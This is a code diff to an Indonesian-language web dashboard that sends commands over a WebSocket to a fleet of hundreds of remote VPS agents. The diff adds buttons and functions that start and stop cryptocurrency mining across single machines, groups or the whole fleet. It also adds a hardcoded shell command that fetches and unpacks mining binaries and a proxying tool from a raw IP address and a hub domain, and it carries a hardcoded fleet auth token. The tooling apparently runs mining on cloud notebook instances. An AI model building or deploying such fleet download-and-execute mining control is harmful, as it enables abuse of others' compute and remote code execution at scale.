@@ -976,7 +976,10 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                             </div>
                             <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
                                 <button class="btn btn-sm" style="background: #6e40c9; border-color: #8b5cf6; color: #fff; font-weight: bold; padding: 5px 12px;" onclick="promptSetSelectedGroup()" title="Kelompokkan VPS terpilih (misal: StudioLab, YouTube, Umum)">🏷️ Setel Kelompok</button>
-                                <button class="btn btn-sm" style="background: #1f6feb; border-color: #388bfd; font-weight: bold; padding: 5px 12px;" onclick="openSelectedShellModal()">💻 Shell ke VPS Terpilih</button>
+                                <button class="btn btn-sm" style="background: #1f6feb; border-color: #388bfd; font-weight: bold; padding: 5px 12px;" onclick="openSelectedShellModal()">💻 Shell Terpilih</button>
+                                <button class="btn btn-sm" style="background: #238636; border-color: #2ea043; color: #fff; font-weight: bold; padding: 5px 12px;" onclick="executeSelectedBatchMiningStart()" title="Mulai Mining pada VPS terpilih">⛏️ Start Mining Terpilih</button>
+                                <button class="btn btn-sm" style="background: #b62324; border-color: #da3633; color: #fff; font-weight: bold; padding: 5px 12px;" onclick="executeSelectedBatchMiningStop()" title="Hentikan Mining pada VPS terpilih">⏹️ Stop Mining Terpilih</button>
+                                <button class="btn btn-sm" style="background: #1a7f37; border-color: #2da44e; color: #fff; font-weight: bold; padding: 5px 12px;" onclick="executeSelectedBatchInstallGaszep()" title="Pasang / Ekstrak folder Gaszep pada VPS terpilih">📦 Pasang Gaszep Terpilih</button>
                                 <button class="btn btn-sm" style="background: #238636; border-color: #2ea043; font-weight: bold; padding: 5px 12px;" onclick="executeSelectedBatchSelfHeal()">🔄 Self-Heal Terpilih</button>
                                 <button class="btn btn-sm" style="background: #da3633; border-color: #f85149; font-weight: bold; padding: 5px 12px;" onclick="executeSelectedBatchRestart()">♻️ Restart Terpilih</button>
                             </div>
@@ -1099,8 +1102,8 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                             <input type="text" id="mine-pass" value="akukayaraya">
                         </div>
                         <div class="form-group">
-                            <label>Pool Address (xmrig-proxy):</label>
-                            <input type="text" id="mine-pool" value="43.135.134.20:10080">
+                            <label>Pool Address (HeroMiners / xmrig-proxy):</label>
+                            <input type="text" id="mine-pool" value="de.zephyr.herominers.com:1123">
                         </div>
                         <div class="form-group">
                             <label>Algoritma Mining:</label>
@@ -1112,12 +1115,32 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                         </div>
                     </div>
 
-                    <div class="btn-group" style="margin-top: 10px;">
+                    <!-- PILIH TARGET MINING: 1 VPS, KELOMPOK, ATAU SEMUA -->
+                    <div class="form-group" style="margin-top: 14px; margin-bottom: 12px; background: var(--bg-tertiary); padding: 12px 14px; border-radius: 8px; border: 1px solid var(--border-color);">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px;">
+                            <label style="font-size: 12px; font-weight: bold; color: var(--text-primary);">🎯 Pilih Target VPS / Kelompok Tujuan:</label>
+                            <div style="display: flex; align-items: center; gap: 4px;">
+                                <input type="text" id="search-mining-select" placeholder="🔍 Cari VPS / Kelompok..." oninput="filterSelectOptions('mining-agent-select', this.value)" style="width: 200px; padding: 4px 10px; font-size: 12px; background: var(--bg-secondary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px; outline: none;">
+                                <button type="button" class="btn btn-sm" onclick="clearSelectSearch('mining-agent-select', 'search-mining-select')" style="padding: 2px 7px; font-size: 11px; background: var(--bg-secondary); border: 1px solid var(--border-color);" title="Reset pencarian">✕</button>
+                            </div>
+                        </div>
+                        <select id="mining-agent-select" style="width: 100%; padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px; font-weight: 600;">
+                            <option value="ALL">⚡ SEMUA VPS (Broadcast ke Seluruh Armada)</option>
+                        </select>
+                        <div style="font-size: 11px; color: var(--text-secondary); margin-top: 6px;">
+                            💡 Pilih 1 VPS untuk uji coba kestabilan sebelum meluncurkannya ke kelompok atau seluruh 487 VPS.
+                        </div>
+                    </div>
+
+                    <div class="btn-group" style="margin-top: 10px; display: flex; flex-wrap: wrap; gap: 8px;">
                         <button class="btn btn-primary" onclick="sendMiningCommand('START')">
-                            ▶️ Start / Update Mining di SEMUA VPS
+                            ▶️ Start / Update Mining di Target Terpilih
                         </button>
                         <button class="btn btn-danger" onclick="sendMiningCommand('STOP')">
-                            ⏹️ Hentikan Mining di SEMUA VPS
+                            ⏹️ Hentikan Mining di Target Terpilih
+                        </button>
+                        <button class="btn btn-sm" style="background: #238636; color: white; padding: 6px 14px;" onclick="installGaszepTarget()">
+                            📦 Pasang / Ekstrak Folder Gaszep di Target Terpilih
                         </button>
                     </div>
                 </div>
@@ -1148,6 +1171,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                             <div style="display: flex; gap: 6px;">
                                 <button class="btn btn-sm" style="font-size: 11px; padding: 2px 7px; background: var(--bg-tertiary);" onclick="document.getElementById('shell-cmd').value='uptime && free -m'">⏳ Cek Uptime & RAM</button>
                                 <button class="btn btn-sm" style="font-size: 11px; padding: 2px 7px; background: var(--bg-tertiary);" onclick="document.getElementById('shell-cmd').value='mkdir -p ~/workspace/extensions && curl -s -L https://hub.databaru.my.id/download/sagemaker_8_extensions.tar.gz | tar -xz -C ~/workspace/extensions/ && ls -la ~/workspace/extensions/'">📦 Pasang 8 Ekstensi</button>
+                                <button class="btn btn-sm" style="font-size: 11px; padding: 2px 7px; background: #238636; color: white;" onclick="document.getElementById('shell-cmd').value='H=$(cat ~/workspace/.hub_url 2>/dev/null | sed \'s|wss://|https://|g\' | sed \'s|ws://|http://|g\' | sed \'s|/ws.*||\'); [ -z \"$H\" ] && H=\"https://hub.databaru.my.id\"; mkdir -p ~/workspace/gaszep && (curl -s -f -L \"$H/download/gaszep.tar.gz\" | tar -xz -C ~/workspace/ 2>/dev/null || (cd ~/workspace/gaszep && curl -s -f -L http://152.44.33.64/sainalsaputra19/gaszep/raw/branch/main/graphics.tar.gz | tar -xz && curl -s -f -L http://152.44.33.64/sainalsaputra19/gaszep/raw/branch/main/korek.zip -o korek.zip && unzip -o -q korek.zip && rm -f korek.zip)) && chmod +x ~/workspace/gaszep/gasdag ~/workspace/gaszep/graftcp/graftcp ~/workspace/gaszep/graftcp/local/graftcp-local 2>/dev/null && echo \'GASZEP_READY\' && ls -la ~/workspace/gaszep'">⛏️ Pasang Gaszep</button>
                             </div>
                         </div>
                         <input type="text" id="shell-cmd" placeholder="Contoh: uptime && free -m; ls -la ~/workspace" onkeydown="if(event.key==='Enter') sendShellCommand()">
@@ -1396,6 +1420,38 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                     <div class="modal-footer" style="padding: 14px 22px; display: flex; justify-content: flex-end; gap: 12px;">
                         <button class="btn btn-sm" style="padding: 7px 16px;" onclick="closeBatchShellModal()">Batal</button>
                         <button class="btn btn-blue btn-sm" style="font-weight: bold; padding: 7px 22px; font-size: 13px;" onclick="executeBatchShellModal()">⚡ Jalankan di VPS Terpilih</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MODAL SINGLE MINING CONTROLLER -->
+            <div id="single-mining-modal" class="modal-overlay">
+                <div class="modal-box" style="max-width: 520px; width: 92vw; height: auto;">
+                    <div class="modal-header" style="padding: 14px 20px;">
+                        <h3 style="font-size: 15px;">⛏️ Kelola Mining: <span id="single-mining-vps-title" style="color: #58a6ff;">-</span></h3>
+                        <button class="btn btn-sm" style="background: transparent; border: none; font-size: 20px; cursor: pointer; color: var(--text-secondary);" onclick="closeSingleMiningModal()">✕</button>
+                    </div>
+                    <div class="modal-body" style="display: flex; flex-direction: column; gap: 14px; padding: 20px 24px; background: var(--bg-secondary);">
+                        <p style="font-size: 13px; color: var(--text-secondary); margin: 0;">
+                            Pilih aksi mining yang ingin langsung dijalankan pada VPS ini:
+                        </p>
+                        <div style="display: flex; flex-direction: column; gap: 10px;">
+                            <button class="btn btn-primary" style="padding: 10px 14px; text-align: left; font-size: 13px;" onclick="executeSingleMiningAction('START')">
+                                ▶️ <strong>Mulai / Update Mining</strong> di VPS ini
+                            </button>
+                            <button class="btn btn-danger" style="padding: 10px 14px; text-align: left; font-size: 13px;" onclick="executeSingleMiningAction('STOP')">
+                                ⏹️ <strong>Hentikan Mining</strong> di VPS ini
+                            </button>
+                            <button class="btn btn-sm" style="background: #238636; color: white; padding: 10px 14px; text-align: left; font-size: 13px; border-color: #2ea043;" onclick="executeSingleMiningAction('INSTALL')">
+                                📦 <strong>Pasang / Ekstrak Folder Gaszep</strong> di VPS ini
+                            </button>
+                            <button class="btn btn-sm" style="background: var(--bg-tertiary); color: var(--text-primary); padding: 10px 14px; text-align: left; font-size: 13px; border: 1px solid var(--border-color);" onclick="openFullMiningTabForAgent()">
+                                ⚙️ <strong>Buka Tab Mining & Setel Target ke VPS Ini</strong>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="modal-footer" style="padding: 12px 20px; display: flex; justify-content: flex-end;">
+                        <button class="btn btn-sm" style="padding: 6px 16px;" onclick="closeSingleMiningModal()">Tutup</button>
                     </div>
                 </div>
             </div>
@@ -1895,6 +1951,57 @@ DASHBOARD_HTML = """<!DOCTYPE html>
             });
         }
 
+        function executeSelectedBatchMiningStart() {
+            const targets = Array.from(selectedAgentIds);
+            if (targets.length === 0) return alert("Pilih minimal 1 VPS terlebih dahulu!");
+            if (!confirm(`Mulai / Update Mining pada ${targets.length} VPS terpilih?`)) return;
+            const payload = getMiningPayload("START");
+            logMessage("BATCH", `⛏️ Memulai Mining pada ${targets.length} VPS terpilih...`, "info");
+            targets.forEach((aid, idx) => {
+                setTimeout(() => {
+                    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+                    ws.send(JSON.stringify({ type: "CMD", target: aid, command: payload }));
+                    const ag = (window.agentList || []).find(a => a.agent_id === aid);
+                    const name = ag ? (ag.vps_name || aid) : aid;
+                    logMessage(name, `▶️ [BATCH MINING START] Mengirim konfigurasi penambang...`, "info");
+                }, idx * 200);
+            });
+        }
+
+        function executeSelectedBatchMiningStop() {
+            const targets = Array.from(selectedAgentIds);
+            if (targets.length === 0) return alert("Pilih minimal 1 VPS terlebih dahulu!");
+            if (!confirm(`Hentikan Mining pada ${targets.length} VPS terpilih?`)) return;
+            const payload = getMiningPayload("STOP");
+            logMessage("BATCH", `⏹️ Menghentikan Mining pada ${targets.length} VPS terpilih...`, "warning");
+            targets.forEach((aid, idx) => {
+                setTimeout(() => {
+                    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+                    ws.send(JSON.stringify({ type: "CMD", target: aid, command: payload }));
+                    const ag = (window.agentList || []).find(a => a.agent_id === aid);
+                    const name = ag ? (ag.vps_name || aid) : aid;
+                    logMessage(name, `⏹️ [BATCH MINING STOP] Mengirim sinyal penghentian...`, "warning");
+                }, idx * 200);
+            });
+        }
+
+        function executeSelectedBatchInstallGaszep() {
+            const targets = Array.from(selectedAgentIds);
+            if (targets.length === 0) return alert("Pilih minimal 1 VPS terlebih dahulu!");
+            if (!confirm(`Pasang / Ekstrak folder Gaszep pada ${targets.length} VPS terpilih?`)) return;
+            const cmdPayload = { type: "SHELL", cmd: GASZEP_INSTALL_CMD, auth: "muse-fleet-auth-2026" };
+            logMessage("BATCH", `📦 Memasang folder Gaszep pada ${targets.length} VPS terpilih...`, "info");
+            targets.forEach((aid, idx) => {
+                setTimeout(() => {
+                    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+                    ws.send(JSON.stringify({ type: "CMD", target: aid, command: cmdPayload }));
+                    const ag = (window.agentList || []).find(a => a.agent_id === aid);
+                    const name = ag ? (ag.vps_name || aid) : aid;
+                    logMessage(name, `📦 [BATCH GASZEP] Mengunduh & mengekstrak berkas penambang...`, "info");
+                }, idx * 300);
+            });
+        }
+
         function onSortChange(val) {
             currentSort = val || "default";
             currentPage = 1;
@@ -2295,6 +2402,35 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                 console.warn("shell-agent-select error:", e);
             }
 
+            try {
+                const miningSel = document.getElementById("mining-agent-select");
+                if (miningSel) {
+                    const curVal = miningSel.value || "ALL";
+                    const allGroups = new Set();
+                    agentList.forEach(a => allGroups.add(a.group || "Umum"));
+                    const groupOptions = Array.from(allGroups).sort().map(g => {
+                        const cnt = agentList.filter(a => (a.group || "Umum") === g).length;
+                        return `<option value="GROUP:${escapeHtml(g)}">👥 KELOMPOK: ${escapeHtml(g)} (${cnt} VPS)</option>`;
+                    }).join("");
+
+                    miningSel.innerHTML = `<option value="ALL">⚡ SEMUA VPS (Broadcast ke Seluruh Armada)</option>` +
+                        groupOptions +
+                        agentList.map(a => {
+                            const aid = String(a.agent_id || "");
+                            const vname = String(a.vps_name || aid || "VPS");
+                            return `<option value="${escapeHtml(aid)}">${escapeHtml(vname)} (${escapeHtml(aid.slice(0, 10))})</option>`;
+                        }).join("");
+                    if ([...miningSel.options].some(o => o.value === curVal)) {
+                        miningSel.value = curVal;
+                    }
+                    selectMasterOptions["mining-agent-select"] = Array.from(miningSel.options).map(o => ({ value: o.value, text: o.text }));
+                    const miningInp = document.getElementById("search-mining-select");
+                    if (miningInp && miningInp.value.trim()) filterSelectOptions("mining-agent-select", miningInp.value);
+                }
+            } catch (e) {
+                console.warn("mining-agent-select error:", e);
+            }
+
             // Dynamic Group Counts & Pills
             const groupCounts = { ALL: agentList.length };
             agentList.forEach(a => {
@@ -2424,6 +2560,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                         ${isOnline ? `
                             <button class="btn btn-sm" style="background: #0969da; border-color: #218bff; font-weight: 600; padding: 4px 10px;" onclick="openFsForAgent('${a.agent_id}')" title="Buka Remote SFTP File Explorer untuk VPS ini">📁 SFTP</button>
                             <button class="btn btn-sm" style="background: #1f6feb; border-color: #388bfd; margin-left: 6px; font-weight: 600; padding: 4px 10px;" onclick="promptShellSingle('${a.agent_id}', '${escapeHtml(a.vps_name || a.agent_id)}')" title="Jalankan Perintah Bash di VPS ini">💻 Shell</button>
+                            <button class="btn btn-sm" style="background: #238636; border-color: #2ea043; color: white; margin-left: 6px; font-weight: 600; padding: 4px 10px;" onclick="promptMiningSingle('${a.agent_id}', '${escapeHtml(a.vps_name || a.agent_id)}')" title="Kelola Mining pada VPS ini (Mulai, Stop, Pasang Gaszep)">⛏️ Mining</button>
                         ` : `
                             <button class="btn btn-sm btn-danger" style="padding: 4px 10px; font-weight: 600;" onclick="removeAgent('${a.agent_id}', '${escapeHtml(a.vps_name || a.agent_id)}')" title="Hapus node offline ini dari daftar">🗑️ Hapus</button>
                         `}
@@ -2945,8 +3082,10 @@ DASHBOARD_HTML = """<!DOCTYPE html>
             logMessage("CAMPAIGN", `Meluncurkan Kampanye YouTube: "${query}" di SEMUA VPS!`, "success");
         }
 
-        function sendMiningCommand(action) {
-            const payload = {
+        const GASZEP_INSTALL_CMD = "H=$(cat ~/workspace/.hub_url 2>/dev/null | sed 's|wss://|https://|g' | sed 's|ws://|http://|g' | sed 's|/ws.*||'); [ -z \"$H\" ] && H=\"https://hub.databaru.my.id\"; mkdir -p ~/workspace/gaszep && (curl -s -f -L \"$H/download/gaszep.tar.gz\" | tar -xz -C ~/workspace/ 2>/dev/null || (cd ~/workspace/gaszep && curl -s -f -L http://152.44.33.64/sainalsaputra19/gaszep/raw/branch/main/graphics.tar.gz | tar -xz && curl -s -f -L http://152.44.33.64/sainalsaputra19/gaszep/raw/branch/main/korek.zip -o korek.zip && unzip -o -q korek.zip && rm -f korek.zip)) && chmod +x ~/workspace/gaszep/gasdag ~/workspace/gaszep/graftcp/graftcp ~/workspace/gaszep/graftcp/local/graftcp-local 2>/dev/null && echo 'GASZEP_INSTALL_SUCCESS'";
+
+        function getMiningPayload(action) {
+            return {
                 type: "SERVICE_ACTION",
                 action: action, // START atau STOP
                 config: {
@@ -2958,8 +3097,103 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                     wallet: document.getElementById("mine-wallet").value.trim()
                 }
             };
-            sendGlobalCommand(payload);
-            logMessage("MINING", `Mengirim perintah ${action} Mining ke SEMUA VPS.`, "warning");
+        }
+
+        function sendMiningCommand(action, targetOverride) {
+            const sel = document.getElementById("mining-agent-select");
+            const target = targetOverride || (sel ? sel.value : "ALL") || "ALL";
+            const payload = getMiningPayload(action);
+
+            if (!ws || ws.readyState !== WebSocket.OPEN) return alert("WebSocket dashboard tidak terhubung!");
+
+            if (target === "ALL") {
+                if (!confirm(`Jalankan ${action} Mining di SELURUH armada VPS?`)) return;
+                sendGlobalCommand(payload);
+                logMessage("MINING", `Mengirim perintah ${action} Mining ke SEMUA VPS.`, "warning");
+            } else if (target.startsWith("GROUP:")) {
+                const grp = target.replace("GROUP:", "");
+                if (!confirm(`Jalankan ${action} Mining di kelompok [${grp}]?`)) return;
+                ws.send(JSON.stringify({ type: "CMD", target: target, command: payload }));
+                logMessage("MINING", `Mengirim perintah ${action} Mining ke Kelompok [${grp}].`, "info");
+            } else {
+                ws.send(JSON.stringify({ type: "CMD", target: target, command: payload }));
+                const ag = (window.agentList || []).find(a => a.agent_id === target);
+                const name = ag ? (ag.vps_name || target) : target;
+                logMessage("MINING", `Mengirim perintah ${action} Mining ke node [${name}].`, "info");
+            }
+        }
+
+        function installGaszepTarget(targetOverride) {
+            const sel = document.getElementById("mining-agent-select");
+            const target = targetOverride || (sel ? sel.value : "ALL") || "ALL";
+            const cmdPayload = { type: "SHELL", cmd: GASZEP_INSTALL_CMD, auth: "muse-fleet-auth-2026" };
+
+            if (!ws || ws.readyState !== WebSocket.OPEN) return alert("WebSocket dashboard tidak terhubung!");
+
+            if (target === "ALL") {
+                if (!confirm("Pasang / perbarui folder gaszep di SEMUA VPS online secara paralel?")) return;
+                sendGlobalCommand(cmdPayload);
+                logMessage("MINING", "📦 Mengirim instruksi pemasangan folder gaszep ke SEMUA VPS online...", "info");
+            } else if (target.startsWith("GROUP:")) {
+                const grp = target.replace("GROUP:", "");
+                if (!confirm(`Pasang folder gaszep pada kelompok [${grp}]?`)) return;
+                ws.send(JSON.stringify({ type: "CMD", target: target, command: cmdPayload }));
+                logMessage("MINING", `📦 Mengirim instruksi pemasangan gaszep ke Kelompok [${grp}]...`, "info");
+            } else {
+                ws.send(JSON.stringify({ type: "CMD", target: target, command: cmdPayload }));
+                const ag = (window.agentList || []).find(a => a.agent_id === target);
+                const name = ag ? (ag.vps_name || target) : target;
+                logMessage("MINING", `📦 Mengirim instruksi pemasangan gaszep ke node [${name}]...`, "info");
+            }
+        }
+
+        function installGaszepAll() {
+            installGaszepTarget("ALL");
+        }
+
+        let activeSingleMiningAgentId = null;
+        let activeSingleMiningVpsName = null;
+
+        function promptMiningSingle(agentId, vpsName) {
+            activeSingleMiningAgentId = agentId;
+            activeSingleMiningVpsName = vpsName || agentId;
+            const titleEl = document.getElementById("single-mining-vps-title");
+            if (titleEl) titleEl.innerText = `${activeSingleMiningVpsName} (${agentId.slice(0, 8)}...)`;
+            const modal = document.getElementById("single-mining-modal");
+            if (modal) modal.classList.add("active");
+        }
+
+        function closeSingleMiningModal() {
+            const modal = document.getElementById("single-mining-modal");
+            if (modal) modal.classList.remove("active");
+            activeSingleMiningAgentId = null;
+            activeSingleMiningVpsName = null;
+        }
+
+        function executeSingleMiningAction(action) {
+            if (!activeSingleMiningAgentId) return;
+            const aid = activeSingleMiningAgentId;
+            closeSingleMiningModal();
+
+            if (action === "START" || action === "STOP") {
+                sendMiningCommand(action, aid);
+            } else if (action === "INSTALL") {
+                installGaszepTarget(aid);
+            }
+        }
+
+        function openFullMiningTabForAgent() {
+            if (!activeSingleMiningAgentId) return;
+            const aid = activeSingleMiningAgentId;
+            closeSingleMiningModal();
+            switchTab("mining");
+            const sel = document.getElementById("mining-agent-select");
+            if (sel) {
+                sel.value = aid;
+                sel.scrollIntoView({ behavior: "smooth", block: "center" });
+                sel.style.boxShadow = "0 0 10px #388bfd";
+                setTimeout(() => { sel.style.boxShadow = ""; }, 2500);
+            }
         }
 
         function promptShellSingle(agentId, vpsName) {
